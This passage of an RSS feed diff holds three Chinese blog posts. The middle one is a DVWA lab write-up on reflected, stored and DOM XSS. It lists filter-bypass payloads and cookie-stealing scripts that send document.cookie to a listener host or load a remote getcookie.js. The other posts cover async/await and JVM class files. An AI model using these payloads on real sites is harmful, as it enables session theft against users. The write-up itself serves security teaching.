+    let b = time(2000)
+    await Promise.all([a,b]); // 不加Promise.all()的话，3s才实行完,加上Promise.all()的话，2s实行完
+    console.log('~~~')
+  } catch(e) {
+    console.log('e',e) // 'e' 出错了
+  }
+}
+f()&lt;/code&gt;
+&lt;/pre&gt;&lt;/li&gt;
+&lt;li readability=&quot;13&quot;&gt;
+&lt;p&gt;await必须在async函数的上下文中的作用域中&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;//for 循环
+async function a() {
+    let arr = [1, 2, 3, 4, 5];
+    for (let i = 0; i &amp;lt; arr.length; i ++) {
+        await arr[i];
+    }
+}
+a();
+// forEach循环
+async function b() {
+  let arr = [1, 2, 3, 4, 5];
+  arr.forEach(item =&amp;gt; {
+      await item;
+  });
+}
+b();// Uncaught SyntaxError: Unexpected identifier&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;原因就是forEach就是一个单独的作用域，会报错。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;h5 id=&quot;总结&quot;&gt;6 总结&lt;/h5&gt;
+&lt;p&gt;async-await函数就是为了简化异步操作的一种方式，大部分就是结合promise使用，离开不了promise，就像那个并发实行需要使用promise的方法。妥善使用async-await，会给自己对异步操作带来很大的便利，另外，感谢一位博主的文章，让我更快的理解async-await函数。&lt;br/&gt;如果本文有什么不对的地方，欢迎指出，谢谢，大家一起进步加油。我把笔记放到&lt;a href=&quot;https://github.com/sqh17/notes/blob/master/ways/async.md&quot;&gt;github&lt;/a&gt;了，如果满意的话给个star～&lt;/p&gt;
+&lt;h5 id=&quot;参考文献&quot;&gt;参考文献&lt;/h5&gt;
+</description>
+<pubDate>Wed, 17 Apr 2019 16:28:00 +0000</pubDate>
+<dc:creator>热爱前端的17号诶</dc:creator>
+<og:description>1 前情摘要 前段时间时间进行项目开发，需求安排不是很合理，导致一直高强度的加班工作，这一个月不是常说的996，简直是936，还好熬过来了。在此期间不是刚学会了es6的promise，在项目有用到pr</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/sqh17/p/10727156.html</dc:identifier>
+</item>
+<item>
+<title>DVWA-XSS学习笔记 - 雨中落叶</title>
+<link>http://www.cnblogs.com/yuzly/p/10692449.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/yuzly/p/10692449.html</guid>
+<description>&lt;p&gt;&lt;span&gt;DVWA-XSS&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;XSS概念:由于web应用程序对用户的输入过滤不严,通过html注入篡改网页，插入恶意脚本，从而在用户浏览网页时,控制用户浏览器的一种攻击。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;XSS类型:&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;反射型XSS:只是简单地把用户输入的数据反射给浏览器,简单来说，黑客往往需要去诱使用户点击一个恶意链接，才能攻击成功。  &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;存储型XSS:将用户输入的数据存储在服务器端，每次用户访问都会被执行js脚本。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;DOM型XSS:文本对象模式xss,通过修改页面的DOM节点形成的XSS，&lt;span&gt;可存储型，可反射型，只取决于输出地点。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;XSS的应用场景:1.利用xss获得cookie,2.重定向，3.钓鱼网站，4.DDOS&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、反射型XSS&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;span&gt;反射型XSS原理&lt;/span&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411201659763-947904709.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;(一)将DVWA的级别设置为low&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.1查看源代码,可以看到没有对参数做任何防御处理措施，直接输出&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202119436-277800635.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.2尝试一般的XSS攻击&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt; &amp;lt;script&amp;gt;alert(‘xss’)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202150198-1799965.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('xss2')&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202212230-870506200.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss3')&amp;gt;click1&amp;lt;/a&amp;gt;    #点击click1时弹出xss3&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202235874-258913149.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;img src=http://192.168.10.128/a.jpg onerror=alert('xss4')&amp;gt;  #src地址错误，然后执行onerror的内容&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202259250-2027788119.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;重定向:&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;window.location='http://www.163.com'&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;iframe src='http://192.168.10.141/a.jpg' height='0' width='0'&amp;gt;&amp;lt;iframe&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202324015-1017772781.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;获取cookie&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202355293-97721967.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/a.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.1在192.168.10.141上开启监听&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;Nc -nvlp 80&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.2在DVWA中输入如下内容&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/a.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.3此时可以在192.168.10.141的主机上获得DVWA的cookie信息&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202429202-455270149.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.4加载远程的js脚本&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.4.1在远端服务器上制作一个js脚本&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202444359-1534449159.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.4.2搭建站点,把js脚本放入到站点中，开启web服务&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;/etc/init.d/apache2 start&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.4.3在js脚本中的192.168.10.141主机上开启监听,&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202502711-1982680231.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.4.4在DVWA中输入如下内容&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script src='http://192.168.10.141/getcookie.js'&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.4.5在192.168.10.141查看js脚本实现的结果&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202530455-2223567.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;(二)将DVWA的级别设置为medium&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.分析源码，可以看到使用str_replace函数只对参数进行了简单的替换,过滤&amp;lt;script&amp;gt;,别的没有过滤,此时可以用大小写或者别的标签来绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202631136-1373540079.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.绕过DVWA  medium防御&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.1大小写绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;Script&amp;gt;alert('xxx')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.2组合过滤条件绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert('sss')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.3尝试使用别的标签来绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('s')&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('ss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert(/ss/)&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;#&amp;lt;script&amp;gt;alert('xx')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;(三)将DVWA的级别设置为High&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt; 1.分析源码，可以看到，使用了preg_replace正则表达式函数，对参数进行过滤，查看源码可以看到对&amp;lt;script&amp;gt;标签进行了严格的过滤，但没有过滤别的标签，此时可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202831380-1897111686.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2. 尝试使用别的标签来绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('s')&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;img src=&quot;&quot; onerror=alert('xss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('ss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert(/ss/)&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;(四)将DVWA的级别设置为Impossible&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.分析源码,可以看到使用htmlspecialchars函数对参数进行html实体转义，此时就无法利用XSS漏洞了&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202928854-1907254347.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202936600-153558115.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;二、存储型XSS&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;存储型XSS攻击原理图:&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203123217-753537818.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;(一)将DVWA的级别设置为low&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.分析源码,可以看到首先对两个参数使用trim函数过滤掉两边的空格,然后$message使用mysql_real_escape_string函数转义SQL语句中的特殊字符，使用&lt;code&gt;s&lt;/code&gt;tripslashes函数过滤掉”\”，对$name参数中使用mysql_real_escape_string函数转义SQL语句中的特殊字符&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203338106-1686645370.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.从上面的代码可以看到,没有防御XSS漏洞，只防御了SQL注入漏洞&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;尝试一般的XSS攻击&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;在message栏中测试:&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;alert('x')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('sss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href=http://www.baidu.com&amp;gt;clock&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;重定向:&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;window.location=’http://www.baidu.com’&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;window.location=’http://192.168.10.141’&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;iframe src='http://192.168.10.10.141/a.jpg' height='0' width='0'&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;获取cookie:&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/c.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.在DVWA message栏中设置字节长度,输入&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/c.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;，然后再kali中开启监听,下图可可以看到获取到DVWA中的cookie信息&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203601145-1078516834.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.换一个浏览器访问192.168.10.130/DVWA中存储型XSS，下图可以看到成功获得cookie信息&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203751822-279522839.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;3.加载远端服务器的js脚本&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;制作一个js脚本&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203828747-786510384.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;把js脚本放到web站点中,开启web服务&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;在DVWA栏中输入&amp;lt;script src=http://192.168.10.143/getcookie.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;在192.168.10.143主机上开启监听,当有用户访问DVWA中存储型xss页面时,就会把cookie信息发送到192.168.10.143主机上&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203851656-1836497980.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;4.修改长度的大小就可以绕过长度的限制了&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203858270-1662657522.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;(二)将DVWA的级别设置为Medium&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.分析源代码,可以看到对$message参数做了很严格的过滤(进行html实体转义以及转义SQL语句中使用的特殊字符，杜绝了对$message关于xss的利用),但对$name参数做的过滤不严格,只是替换&amp;lt;script&amp;gt;以及转义SQL语句中使用的特殊字符,可以使用别的html标签对$name参数的防护进行绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204035574-546179836.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.绕过DVWA medium级别&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;Script&amp;gt;alert('x')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('xss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;(三)将DVWA的级别设置为High&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.分析源码,可以看到相比较中级而言，高级对$nam参数多了对&amp;lt;script&amp;gt;严格的过滤,没有对别的标签做过滤,但可以通过别的html标签来进行绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204126955-6671362.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.绕过&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('xss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&lt;strong&gt;(四)将DVWA的级别设置为Impossible&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;1.分析源码可以看到,对两个参数都做了html实体转义,无法利用xss&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204223979-939951006.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、DOM型XSS&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;文本对象模型&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;可储存型，可反射型,取决于输出地点&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;var img=document.createElement('img');img.src='http://192.168.10.143:88/log?'+escape(document.cookie);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;&lt;span&gt;1.在DVWA中反射型xss中输入&amp;lt;script&amp;gt;var img=document.createElement('img');img.src='http://192.168.10.143:88/log?'+escape(document.cookie);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;2.在192.168.10.143主机上开启监听,可以看到&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204336733-377586324.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p align=&quot;left&quot;&gt;&lt;span&gt;3.在DVWA中存储型xss中输入&amp;lt;script&amp;gt;var img=document.createElement('img');img.src='http://192.168.10.143:88/log?'+escape(document.cookie);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span&gt;4. 在192.168.10.143主机上开启监听,可以看到&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204418396-644933470.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+
+
+
+</description>
+<pubDate>Wed, 17 Apr 2019 16:27:00 +0000</pubDate>
+<dc:creator>雨中落叶</dc:creator>
+<og:description>DVWA-XSS XSS概念:由于web应用程序对用户的输入过滤不严,通过html注入篡改网页，插入恶意脚本，从而在用户浏览网页时,控制用户浏览器的一种攻击。 XSS类型: 反射型XSS:只是简单地把</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/yuzly/p/10692449.html</dc:identifier>
+</item>
+<item>
+<title>【JVM虚拟机】(8)--深入理解Class中--方法、属性表集合 - 雨点的名字</title>
+<link>http://www.cnblogs.com/qdhxhz/p/10727117.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/qdhxhz/p/10727117.html</guid>
+<description>&lt;center&gt;
+
+&lt;/center&gt;
+&lt;p&gt;之前有关class文件已经写了两篇博客：&lt;/p&gt;
+&lt;p&gt;1、&lt;a href=&quot;https://www.cnblogs.com/qdhxhz/p/10646088.html&quot;&gt;【JVM虚拟机】(5)---深入理解JVM-Class中常量池&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2、&lt;a href=&quot;https://www.cnblogs.com/qdhxhz/p/10676337.html&quot;&gt;【JVM虚拟机】(6)---深入理解Class中访问标志、类索引、父类索引、接口索引&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;3、&lt;a href=&quot;https://www.cnblogs.com/qdhxhz/p/10693324.html&quot;&gt;【JVM虚拟机】(7)---深入理解Class中-属性集合&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;那么这篇博客主要讲有关 &lt;strong&gt;方法表集合&lt;/strong&gt; 相关的理解和代码示例。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;方法表集合&lt;/code&gt;: 告知该方法是什么修饰符修饰？是否有方法值？返回类型是什么？方法名称，方法参数，还有就是方法内的一些信息。&lt;/p&gt;
+&lt;h2 id=&quot;一方法集合概念&quot;&gt;&lt;span&gt;一、方法集合概念&lt;/span&gt;&lt;/h2&gt;
+&lt;h4 id=&quot;概念&quot;&gt;1、概念&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;方法表集合&lt;/code&gt;：方法表集合和属性表集合其实很相似,都是由&lt;code&gt;一个计数器(方法)&lt;/code&gt;和&lt;code&gt;若干个方法表&lt;/code&gt;构成，只不过方法表的结构相对复杂很多。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;方法表的结构体&lt;/code&gt;：&lt;strong&gt;访问标志(access_flags)、名称索引(name_index)、描述索引(descriptor_index)、属性表(attribute_info)集合&lt;/strong&gt;组成。&lt;/p&gt;
+&lt;pre class=&quot;java&quot;&gt;
+&lt;code&gt;method_info {
+                    u2 access_flags;
+                    u2 name_index;
+                    u2 descriptor_index;
+                    u2 attributes_count;
+                    attribute_info attributes[attributes_count];
+             }&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;1)、&lt;code&gt;访问标志&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;不多说了,和属性中的其实差不多，只是有些修饰符不一样。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235540325-1150347478.jpg&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;2）、&lt;code&gt;名称索引&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;就是指这个方法的名称。如：'public void getXX()'中，getXX就是名称索引。&lt;strong&gt;名称索引&lt;/strong&gt;占&lt;strong&gt;两个字节&lt;/strong&gt;，这个方法的名称以UTF-8格式的字符串存储在这个&lt;strong&gt;常量池项&lt;/strong&gt;中。&lt;/p&gt;
+&lt;p&gt;3)、&lt;code&gt;描述索引&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;指这个方法的返回值,方法内参数信息。一个方法的描述包含若干个参数的数据类型和返回值的数据类型。&lt;/p&gt;
+&lt;p&gt;4)、&lt;code&gt;属性表(attribute_info)集合&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;下面讲&lt;/p&gt;
+&lt;h2 id=&quot;二属性表集合&quot;&gt;&lt;span&gt;二、属性表集合&lt;/span&gt;&lt;/h2&gt;
+&lt;h4 id=&quot;概述&quot;&gt;1、概述&lt;/h4&gt;
+&lt;p&gt;在Class文件、字段表、方法表都可以携带自己的属性表集合，用于描述某些场景专有的信息。&lt;br/&gt;在方法表中, 属性表集合记录了某个方法的一些属性信息，这些信息包括：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;这个方法的代码实现，即&lt;code&gt;方法的可执行的机器指令&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;这个方法声明的要&lt;code&gt;抛出的异常信息&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;这个方法是否&lt;code&gt;被@deprecated注解表示&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;这个方法是否是&lt;code&gt;编译器自动生成的&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;属性表（attribute_info）&lt;/strong&gt;结构体的一般结构如下所示：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235716144-1459133840.jpg&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;属性表占着非常大的一部分且定义了众多属性,上面只列举了4个,查看完成的:&lt;a href=&quot;https://www.cnblogs.com/lrh-xl/p/5351182.html&quot;&gt;JDK1.7版本中21项属性表集合简要介绍&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;下面介绍两个重要的属性&lt;/p&gt;
+&lt;h4 id=&quot;code属性&quot;&gt;1、Code属性&lt;/h4&gt;
